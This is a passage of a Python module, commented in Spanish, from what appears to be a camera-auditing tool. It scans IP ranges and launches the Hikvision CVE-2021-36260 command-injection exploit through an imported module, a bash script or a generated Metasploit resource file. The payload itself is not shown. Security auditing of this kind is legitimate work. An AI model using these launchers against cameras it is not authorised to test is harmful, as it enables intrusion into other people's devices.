        """
        Escaneo estilo Metasploit para CVE-2021-36260
        
        Args:
            rhosts (str): Rango de IPs o IP específica (formato Metasploit)
            rport (int): Puerto objetivo
            targeturi (str): URI objetivo
        
        Returns:
            list: Resultados del escaneo
        """
        print(f"🔍 SmartCam Auditor - Metasploit Style Scanner")
        print(f"   Module: auxiliary/scanner/http/hikvision_cmd_injection")
        print(f"   RHOSTS: {rhosts}")
        print(f"   RPORT: {rport}")
        print(f"   TARGETURI: {targeturi}")
        print()
        
        resultados = []
        
        try:
            # Parsear RHOSTS (puede ser IP individual, rango CIDR, o lista)
            targets = self._parse_rhosts(rhosts)
            
            print(f"[*] Scanning {len(targets)} targets...")
            
            for target_ip in targets:
                print(f"[*] Testing {target_ip}...")
                
                resultado = self.exploit_target(
                    target_ip=target_ip,
                    target_port=rport,
                    cve_id="CVE-2021-36260",
                    endpoint=targeturi
                )
                
                resultado['target'] = target_ip
                resultado['port'] = rport
                resultado['uri'] = targeturi
                
                resultados.append(resultado)
                
                # Pausa breve entre targets
                time.sleep(0.5)
            
            # Resumen estilo Metasploit
            vulnerable_count = len([r for r in resultados if r.get('exploit_exitoso')])
            
            print(f"\n[*] Scanned {len(targets)} targets")
            print(f"[+] Found {vulnerable_count} vulnerable targets")
            
            return resultados
            
        except Exception as e:
            print(f"❌ Error en escaneo: {str(e)}")
            return []

    def _parse_rhosts(self, rhosts):
        """
        Parsea el parámetro RHOSTS al estilo Metasploit
        
        Args:
            rhosts (str): Puede ser IP individual, rango CIDR, o lista separada por espacios/comas
        
        Returns:
            list: Lista de IPs
        """
        targets = []
        
        # Limpiar entrada
        rhosts = rhosts.strip()
        
        # Si contiene CIDR notation
        if '/' in rhosts:
            try:
                import ipaddress
                network = ipaddress.IPv4Network(rhosts, strict=False)
                targets = [str(ip) for ip in network.hosts()]
                
                # Limitar a 254 hosts para evitar escaneos masivos
                if len(targets) > 254:
                    print(f"[WARNING] Large network detected ({len(targets)} hosts). Limiting to first 254.")
                    targets = targets[:254]
                    
            except ValueError:
                print(f"[ERROR] Invalid CIDR notation: {rhosts}")
                return []
        
        # Si contiene múltiples IPs separadas por comas o espacios
        elif ',' in rhosts or ' ' in rhosts:
            separators = [',', ' ']
            for sep in separators:
                if sep in rhosts:
                    targets = [ip.strip() for ip in rhosts.split(sep) if ip.strip()]
                    break
        
        # IP individual
        else:
            targets = [rhosts]
        
        # Validar IPs
        valid_targets = []
        for target in targets:
            try:
                import ipaddress
                ipaddress.IPv4Address(target)
                valid_targets.append(target)
            except ValueError:
                print(f"[WARNING] Invalid IP address: {target}")
        
        return valid_targets

# Funciones de compatibilidad con el código existente
def scan_network(network_range=None):
    """
    Función principal de escaneo de red (mantiene compatibilidad)
    
    Args:
        network_range (str): Rango de red en formato CIDR
    
    Returns:
        list: Lista de dispositivos encontrados
    """
    scanner = NetworkScanner()
    
    if not network_range:
        network_range = scanner.get_local_network()
    
    devices = scanner.scan_network(network_range)
    
    # Convertir formato para compatibilidad con código existente
    compatible_format = []
    for device in devices:
        compatible_format.append({
            'ip': device['ip'],
            'status': 'activo',
            'method': 'advanced_scanner',
            'device_type': device['device_type'],
            'open_ports': device['open_ports'],
            'confidence': device['confidence']
        })
    
    return compatible_format

def scan_target_network(target_ip):
    """Escanea la red del IP objetivo"""
    try:
        # Determinar la red basándose en la IP objetivo
        ip_parts = target_ip.split('.')
        network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
        return scan_network(network)
    except Exception as e:
        print(f"[ERROR] Error escaneando red objetivo: {e}")
        return []

# Funciones de compatibilidad con nombres originales del usuario
def obtener_ips_dispositivos(rango_red=None):
    """
    Función de compatibilidad - mantiene el nombre original del usuario
    
    Args:
        rango_red (str): Rango de red en formato CIDR (ej: 192.168.1.0/24)
                        Si no se especifica, usa el valor de la configuración
    
    Returns:
        list: Lista de IPs de dispositivos encontrados
    """
    # Usar configuración por defecto si no se especifica rango
    if not rango_red:
        try:
            with open("config/config.json", 'r', encoding='utf-8') as f:
                config = json.load(f)
            rango_red = config.get('network_range', '192.168.1.0/24')
            print(f"[*] Usando rango de red de la configuración: {rango_red}")
        except:
            rango_red = '192.168.1.0/24'
            print(f"[*] Usando rango de red por defecto: {rango_red}")
    
    # Usar el escáner avanzado pero retornar solo las IPs como en el código original
    scanner = NetworkScanner(timeout=1.5, max_threads=50)
    
    # Notificar inicio de escaneo por Telegram
    if scanner.telegram and scanner.telegram.is_enabled():
        scanner.telegram.notify_scan_start(rango_red)
    
    devices = scanner.scan_network(rango_red)
    
    # Extraer solo las IPs para compatibilidad
    ips_detectadas = [device['ip'] for device in devices]
    
    # Notificar resultados por Telegram
    if scanner.telegram and scanner.telegram.is_enabled():
        results_summary = {
            'devices_found': len(ips_detectadas),
            'vulnerabilities_found': 0,  # Se actualizará después con las pruebas de credenciales
            'scan_time': 'N/A'
        }
        scanner.telegram.notify_scan_complete(results_summary)
    
    print(f"🔎 IPs activas encontradas: {ips_detectadas}")
    return ips_detectadas

def exploit_hikvision(ip):
    """
    Función de template para uso directo del exploit de Hikvision CVE-2021-36260
    
    Args:
        ip (str): Dirección IP del dispositivo Hikvision objetivo
    
    Returns:
        dict: Resultado del exploit con información detallada
    
    Example:
        resultado = exploit_hikvision("192.168.1.100")
        if resultado.get('vulnerable'):
            print(f"¡Dispositivo {ip} es vulnerable!")
    """
    try:
        from exploits.hikvision_cve2021_36260 import exploit
        return exploit(ip)
    except ImportError as e:
        print(f"❌ Error: Módulo de exploit Hikvision no encontrado: {e}")
        return {
            'vulnerable': False,
            'error': 'Módulo de exploit no disponible',
            'detalle': str(e)
        }
    except Exception as e:
        print(f"❌ Error ejecutando exploit Hikvision: {e}")
        return {
            'vulnerable': False,
            'error': 'Error en ejecución de exploit',
            'detalle': str(e)
        }

def exploit_hikvision_bash(ip):
    """
    Ejecuta el exploit de Hikvision usando un script bash
    
    Args:
        ip (str): Dirección IP del dispositivo Hikvision objetivo
    
    Returns:
        bool: True si el exploit fue exitoso, False en caso contrario
    
    Example:
        if exploit_hikvision_bash("192.168.1.100"):
            print("¡Exploit exitoso!")
    """
    try:
        script_path = "exploits/hikvision_cve2021_36260.sh"
        
        # Verificar que el script existe
        if not os.path.exists(script_path):
            print(f"❌ Error: Script bash no encontrado: {script_path}")
            return False
        
        # Ejecutar el script bash
        print(f"🐚 Ejecutando exploit bash para {ip}...")
        result = subprocess.call(["bash", script_path, ip])
        
        success = result == 0
        if success:
            print(f"✅ Exploit bash exitoso para {ip}")
        else:
            print(f"❌ Exploit bash falló para {ip} (código: {result})")
        
        return success
        
    except FileNotFoundError:
        print("❌ Error: bash no encontrado en el sistema")
        return False
    except Exception as e:
        print(f"❌ Error ejecutando exploit bash: {e}")
        return False

def exploit_hikvision_msf(ip):
    """
    Ejecuta el exploit de Hikvision usando Metasploit Framework
    
    Args:
        ip (str): Dirección IP del dispositivo Hikvision objetivo
    
    Returns:
        bool: True si el comando se ejecutó correctamente, False en caso contrario
    
    Example:
        exploit_hikvision_msf("192.168.1.100")
    """
    try:
        # Crear directorio de exploits si no existe
        os.makedirs("exploits", exist_ok=True)
        
        # Crear archivo de resource para Metasploit
        rc_file = "exploits/tmp_msf.rc"
        
        with open(rc_file, "w") as f:
            f.write("use auxiliary/scanner/http/hikvision_cmd_injection\n")
            f.write(f"set RHOSTS {ip}\n")
            f.write("set RPORT 80\n")
            f.write("set TARGETURI /SDK/webLanguage\n")
            f.write("run\n")
            f.write("exit\n")
        
        print(f"🎯 Ejecutando exploit Metasploit para {ip}...")
        print(f"📁 Archivo resource creado: {rc_file}")
        
        # Ejecutar Metasploit
        result = subprocess.call(["msfconsole", "-q", "-r", rc_file])
        
        # Limpiar archivo temporal
        try:
            os.remove(rc_file)
        except:
            pass
        
        if result == 0:
            print(f"✅ Metasploit ejecutado correctamente para {ip}")
        else:
            print(f"⚠️ Metasploit completado con código: {result}")
        
        return result == 0
        
    except FileNotFoundError:
        print("❌ Error: msfconsole no encontrado. ¿Metasploit está instalado?")
        return False
    except Exception as e:
        print(f"❌ Error ejecutando Metasploit: {e}")
        return False

# NOTA: La función fingerprint_camaras se ha movido al módulo dedicado scanner.fingerprint_nmap
# Para usar fingerprinting, importa desde: from scanner.fingerprint_nmap import fingerprint_camaras
